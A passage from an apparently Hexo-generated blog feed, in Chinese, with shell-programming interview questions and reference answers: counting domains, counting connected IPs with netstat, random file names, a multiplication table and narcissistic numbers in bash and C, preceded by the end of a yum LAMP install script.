&#x5B89;&#x88C5;&#x90E8;&#x7F72; LNMP,&#x9700;&#x8981;&#x63D0;&#x524D;&#x914D;&#x7F6E;&#x597D; yum &#x6E90;,&#x5426;&#x5219;&#x8BE5;&#x811A;&#x672C;&#x4F1A;&#x5931;&#x8D25;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> &#x672C;&#x811A;&#x672C;&#x4F7F;&#x7528;&#x4E8E; centos7.2 &#x6216; RHEL7.2</span></span><br><span class="line"></span><br><span class="line">yum install -y httpd</span><br><span class="line">yum install -y mariadb mariadb-devel mariadb-server</span><br><span class="line">yum install -y httpd</span><br><span class="line">yum install -y php php-mysql</span><br><span class="line"></span><br><span class="line">systemctl start httpd mariadb</span><br><span class="line">systemctl enable httpd mariadb</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;&amp;#x67E5;&amp;#x770B;&amp;#x6709;&amp;#x591A;&amp;#x5C11;&amp;#x8FDC;&amp;#x7A0B;&amp;#x7684;IP&amp;#x5728;&amp;#x8FDE;&amp;#x63A5;&amp;#x672C;&amp;#x673A;&lt;/strong&gt;&lt;br&gt;&lt;/p&gt;&lt;figur
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SHELL编程类面试题</title>
    <link href="https://marnm.github.io//posts/dbd9d26a/"/>
    <id>https://marnm.github.io//posts/dbd9d26a/</id>
    <published>2022-06-07T04:52:23.000Z</published>
    <updated>2022-06-07T05:04:35.990Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-&#x6709;&#x4E00;&#x4E2A;test-txt&#x6587;&#x672C;-&#x5185;&#x5BB9;&#x5982;&#x4E0B;-&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;"><a href="#1-&#x6709;&#x4E00;&#x4E2A;test-txt&#x6587;&#x672C;-&#x5185;&#x5BB9;&#x5982;&#x4E0B;-&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;" class="headerlink" title="1. &#x6709;&#x4E00;&#x4E2A;test.txt&#x6587;&#x672C;(&#x5185;&#x5BB9;&#x5982;&#x4E0B;)&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;"></a>1. &#x6709;&#x4E00;&#x4E2A;test.txt&#x6587;&#x672C;(&#x5185;&#x5BB9;&#x5982;&#x4E0B;)&#xFF0C;&#x8981;&#x6C42;&#x5C06;&#x6240;&#x6709;&#x57DF;&#x540D;&#x622A;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x7EDF;&#x8BA1;&#x91CD;&#x590D;&#x57DF;&#x540D;</h3><blockquote><p>&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x3002;<br><a href="https://www.baidu.com/index.html" target="_blank" rel="noopener">https://www.baidu.com/index.html</a><br><a href="https://www.jaking.com/index.html" target="_blank" rel="noopener">https://www.jaking.com/index.html</a><br><a href="https://www.sina.com.cn/1024.html" target="_blank" rel="noopener">https://www.sina.com.cn/1024.html</a><br><a href="https://www.jaking.com/2048.html" target="_blank" rel="noopener">https://www.jaking.com/2048.html</a><br><a href="https://www.sina.com.cn/4096.html" target="_blank" rel="noopener">https://www.sina.com.cn/4096.html</a><br><a href="https://www.jaking.com/8192.html" target="_blank" rel="noopener">https://www.jaking.com/8192.html</a></p></blockquote><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;:</strong><br><a id="more"></a><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat test.txt | cut -d <span class="string">&quot;/&quot;</span> -f 3 | sort | uniq -c | sort -nr</span><br><span class="line"></span><br><span class="line"><span class="comment"># cut -d &#x6309;&#x7167;&#x5206;&#x9694;&#x7B26;&#x5206;&#x5272;</span></span><br><span class="line"><span class="comment"># -f 3&#x622A;&#x53D6;&#x7B2C;&#x4E09;&#x5217;</span></span><br><span class="line"><span class="comment"># uniq -c &#x663E;&#x793A;&#x6539;&#x884C;&#x91CD;&#x590D;&#x6B21;&#x6570;</span></span><br><span class="line"><span class="comment"># sort -nr &#x6309;&#x7167;&#x6570;&#x5B57;&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x6392;&#x5217;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="2-&#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;"><a href="#2-&#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;" class="headerlink" title="2. &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;"></a>2. &#x7EDF;&#x8BA1;&#x5F53;&#x524D;&#x670D;&#x52A1;&#x5668;&#x6B63;&#x5728;&#x8FDE;&#x63A5;&#x7684;IP&#x5730;&#x5740;&#xFF0C;&#x5E76;&#x6309;&#x8FDE;&#x63A5;&#x6B21;&#x6570;&#x6392;&#x5E8F;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntup | grep -o [0-9].* | awk <span class="string">&apos;{print $3}&apos;</span> | cut -d: -f 1 | sort | uniq -c | sort -rn</span><br><span class="line"><span class="comment"># netstat -ntup &#x663E;&#x793A;TCP&#x548C;UDP&#x7684;&#x8FDE;&#x63A5;&#x72B6;&#x51B5;&#xFF0C;&#x4E14;&#x76F4;&#x63A5;&#x663E;&#x793A;IP&#x5730;&#x5740;&#xFF1B;</span></span><br><span class="line"><span class="comment"># grep -o [0-9].* &#x53EA;&#x8F93;&#x51FA;&#x5339;&#x914D;&#x5230;&#x7684;&#x90E8;&#x5206;&#xFF0C;</span></span><br><span class="line"><span class="comment"># awk &apos;{print $3}&apos; &#x9009;&#x62E9;&#x5339;&#x914D;&#x641C;&#x7D22;&#x5230;&#x7684;&#x7B2C;3&#x5217;</span></span><br><span class="line"><span class="comment"># cut -d: -f1 &#x6307;&#x5B9A;&#x5206;&#x9694;&#x7B26; : &#x6307;&#x5B9A;&#x663E;&#x793A;&#x7B2C;1&#x4E2A;&#x5B57;&#x6BB5;</span></span><br><span class="line"><span class="comment"># sort &#x9ED8;&#x8BA4;&#x5347;&#x5E8F;&#x6392;&#x5E8F;</span></span><br><span class="line"><span class="comment"># uniq -c &#x7EDF;&#x8BA1;&#x5404;&#x884C;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;</span></span><br><span class="line"><span class="comment"># sort -rn  &#x6839;&#x636E;&#x6570;&#x5B57;&#x8FDB;&#x884C;&#x5012;&#x5E8F;&#x6392;&#x5E8F;</span></span><br></pre></td></tr></tbody></table></figure><h3 id="3-&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;-jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;"><a href="#3-&#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;-jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;" class="headerlink" title="3. &#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;/jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;"></a>3. &#x4F7F;&#x7528;&#x5FAA;&#x73AF;&#x5728;/jaking&#x76EE;&#x5F55;&#x4E0B;&#x521B;&#x5EFA;10&#x4E2A;txt&#x6587;&#x4EF6;&#xFF0C;&#x8981;&#x6C42;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#x7531;6&#x4F4D;&#x968F;&#x673A;&#x5C0F;&#x3002;</h3><blockquote><p>&#x5199;&#x5B57;&#x6BCD;&#x52A0;&#x56FA;&#x5B9A;&#x5B57;&#x7B26;&#x4E32;&#xFF08;_nb&#xFF09;&#x7EC4;&#x6210;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;jk16ok_nb.txt&#x3002;</p></blockquote><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># &#x68C0;&#x67E5;jaking&#x662F;&#x5426;&#x5B58;&#x5728;&#x5E76;&#x4E14;&#x662F;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d /jaking ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">mkdir /jaking</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">cd</span> /jaking<span class="comment"># &#x8FDB;&#x5165;&#x6D4B;&#x8BD5;&#x76EE;&#x5F55;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&#x5FAA;&#x73AF;10&#x6B21;&#xFF0C;&#x6BCF;&#x6B21;&#x5FAA;&#x73AF;&#x5EFA;&#x7ACB;6&#x4F4D;&#x968F;&#x673A;&#x6570;&#x6587;&#x4EF6;</span></span><br><span class="line"><span class="keyword">for</span> ((i=1;i&lt;=10;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">filename=$(tr -dc <span class="string">&apos;A-Za-z0-9&apos;</span> &lt; /dev/urandom | head -c 6)</span><br><span class="line">touch <span class="string">&quot;<span class="variable">$filename</span>&quot;</span>_gg.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /dev/urandom &#x4E0E; /dev/random</span></span><br><span class="line"><span class="comment"># /dev/urandom&#x975E;&#x963B;&#x585E;&#x968F;&#x673A;&#x6570;&#x53D1;&#x751F;&#x5668;&#xFF0C;&#x8BFB;&#x53D6;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x963B;&#x585E;</span></span><br><span class="line"><span class="comment"># /dev/random&#x5B58;&#x50A8;&#x7740;&#x7CFB;&#x7EDF;&#x5F53;&#x524D;&#x8FD0;&#x884C;&#x73AF;&#x5883;&#x7684;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#xFF0C;&#x662F;&#x963B;&#x585E;&#x7684;&#x968F;&#x673A;&#x6570;&#x53D1;&#x751F;&#x5668;&#xFF0C;&#x8BFB;&#x53D6;&#x6709;&#x65F6;&#x9700;&#x8981;&#x7B49;&#x5F85;</span></span><br><span class="line"><span class="comment"># &#x901A;&#x5E38;&#x4F7F;&#x7528;urandom&#x751F;&#x6210;&#x968F;&#x673A;&#x6570;&#xFF0C;&#x4F7F;&#x7528;urandom&#x907F;&#x514D;&#x963B;&#x585E;</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="4-&#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;"><a href="#4-&#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;" class="headerlink" title="4. &#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;"></a>4. &#x7528;Shell&#x5199;99&#x4E58;&#x6CD5;&#x8868;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong><br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&#x65B9;&#x5F0F;&#x4E00;</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">n=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$n</span> -lt 10 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">      <span class="keyword">for</span> (( m=1;m&lt;=<span class="variable">$n</span>;m++ ))</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n -e <span class="string">&quot;<span class="variable">${m}</span>x<span class="variable">${n}</span>=$[m*n]\t&quot;</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line">n=$((n+1))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">#-----------------&#x6216;&#x8005;---------------------------</span></span><br><span class="line">n=9</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$n</span> -ge 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span>((i=1;i&lt;=<span class="variable">$n</span>;i++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -n -e <span class="string">&quot;<span class="variable">${i}</span>x<span class="variable">${n}</span>=$[ n*i ]\t&quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="comment">#   echo $n</span></span><br><span class="line">    n=$((n-1))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x65B9;&#x5F0F;&#x4E8C;</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> {1..9}</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> `seq <span class="variable">$j</span>`</span><br><span class="line">      <span class="keyword">do</span>        <span class="built_in">echo</span> -e -n <span class="string">&quot;<span class="variable">${i}</span>x<span class="variable">${j}</span>=$[ <span class="variable">$i</span> * <span class="variable">$j</span> ]\t&quot;</span></span><br><span class="line">      <span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment"># ---------------&#x6216;&#x8005;----------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> {9..1}</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span>((j=1;j&lt;=<span class="variable">$i</span>;j++))</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -e -n <span class="string">&quot;<span class="variable">${j}</span>x<span class="variable">${i}</span>=$[ i*j ]  &quot;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="5-&#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;-3-&#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684;-3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1-3-5-3-3-3-153&#xFF09;&#x3002;"><a href="#5-&#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;-3-&#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684;-3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1-3-5-3-3-3-153&#xFF09;&#x3002;" class="headerlink" title="5. &#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A; 3 &#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684; 3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1^3 + 5^3+ 3^3 = 153&#xFF09;&#x3002;"></a>5. &#x5199;&#x51FA;1000&#x4EE5;&#x5185;&#x7684;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x3002;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF1A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A; 3 &#x4F4D;&#x6570;&#xFF0C;&#x5B83;&#x7684;&#x6BCF;&#x4E2A;&#x4F4D;&#x4E0A;&#x7684;&#x6570;&#x5B57;&#x7684; 3&#x6B21;&#x5E42;&#x4E4B;&#x548C;&#x7B49;&#x4E8E;&#x5B83;&#x672C;&#x8EAB;&#xFF08;&#x4F8B;&#x5982;&#xFF1A;1^3 + 5^3+ 3^3 = 153&#xFF09;&#x3002;</h3><p><strong>&#x53C2;&#x8003;&#x7B54;&#x6848;</strong></p><blockquote><p>  &#x6240;&#x8C13;&#x201D;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x201D;&#x662F;&#x6307;&#x4E00;&#x4E2A;&#x4E09;&#x4F4D;&#x6570;&#xFF0C;&#x5176;&#x5404;&#x4F4D;&#x6570;&#x5B57;&#x7ACB;&#x65B9;&#x548C;&#x7B49;&#x4E8E;&#x8BE5;&#x672C;&#x8EAB;&#x3002; &#x4F8B;&#x5982;&#xFF1A;153&#x662F;&#x4E00;&#x4E2A;&#x6C34;&#x4ED9;&#x82B1;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;153=1^3+5^3+3^3&#x3002;</p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># &#x6C34;&#x4ED9;&#x82B1;&#x6570;&#x662F;&#x6307;&#x4E00;&#x4E2A;3&#x4F4D;&#x6570;&#xFF0C;&#x5176;&#x5404;&#x4F4D;&#x6570;&#x5B57;&#x7ACB;&#x65B9;&#x548C;&#x7B49;&#x4E8E;&#x8BE5;&#x672C;&#x8EAB;&#xFF0C;&#x6240;&#x4EE5;&#x76F4;&#x63A5;&#x4ECE;100&#x5F00;&#x59CB;&#x627E;&#xFF1A;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> {100..1000}</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">      a=<span class="variable">${i:0:1}</span></span><br><span class="line">      b=<span class="variable">${i:1:1}</span></span><br><span class="line">      c=<span class="variable">${i:2}</span></span><br><span class="line">      num=$[<span class="variable">$a</span>**3+<span class="variable">$b</span>**3+<span class="variable">$c</span>**3]</span><br><span class="line">      [ <span class="variable">$num</span> -eq <span class="variable">$i</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;water flower number is: <span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#x53C2;&#x8003;C&#x7684;&#x5199;&#x6CD5;</span></span><br><span class="line"><span class="comment">//&#x65B9;&#x6CD5;&#x4E00;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span>&#xA0;<span class="title">cube</span><span class="params">(<span class="keyword">const</span>&#xA0;<span class="keyword">int</span>&#xA0;n)</span></span>{</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">return</span>&#xA0;n*n*n;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">bool</span></span><br><span class="line">isNarcissistic(<span class="keyword">const</span>&#xA0;<span class="keyword">int</span>&#xA0;n){<span class="comment">//&#x5224;&#x65AD;&#x662F;&#x4E0D;&#x662F;&#x6C34;&#x4ED9;&#x82B1;&#x6570;</span></span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">int</span>&#xA0;hundreds=n/<span class="number">100</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">int</span>&#xA0;tens=n/<span class="number">10</span>-hundreds*<span class="number">10</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">int</span>&#xA0;ones=n%<span class="number">10</span>;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">return</span>&#xA0;cube(hundreds)+cube(tens)+cube(ones)==n;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span>&#xA0;<span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>{</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">int</span>&#xA0;i;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">for</span>(i=<span class="number">100</span>;i&lt;<span class="number">1000</span>;++i){</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">if</span>(isNarcissistic(i))</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;}</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">return</span>&#xA0;<span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">//=============================================//</span></span><br><span class="line"><span class="comment">//&#x65B9;&#x6CD5;&#x4E8C;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&#xA0;<span class="meta-string">&lt;stdio.h&gt;&#xA0;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>&#xA0;<span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span>&#xA0;<span class="title">main</span><span class="params">()</span>&#xA0;</span></span><br><span class="line"><span class="function"></span>{&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">int</span>&#xA0;i,j,k,n;&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="built_in">printf</span>(<span class="string">&quot;&apos;water&#xA0;flower&apos;number&#xA0;is:&quot;</span>);&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">for</span>(n=<span class="number">100</span>;n&lt;<span class="number">1000</span>;n++)&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;{&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;i=n/<span class="number">100</span>;<span class="comment">/*&#x5206;&#x89E3;&#x51FA;&#x767E;&#x4F4D;*/</span>&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;j=n/<span class="number">10</span>%<span class="number">10</span>;<span class="comment">/*&#x5206;&#x89E3;&#x51FA;&#x5341;&#x4F4D;*/</span>&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;k=n%<span class="number">10</span>;<span class="comment">/*&#x5206;&#x89E3;&#x51FA;&#x4E2A;&#x4F4D;*/</span>&#xA0;</span><br><span class="line">&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;<span class="keyword">if</span>(n==i*i*i+j*j*j+k*k*k)&#xA0;</span><br><span 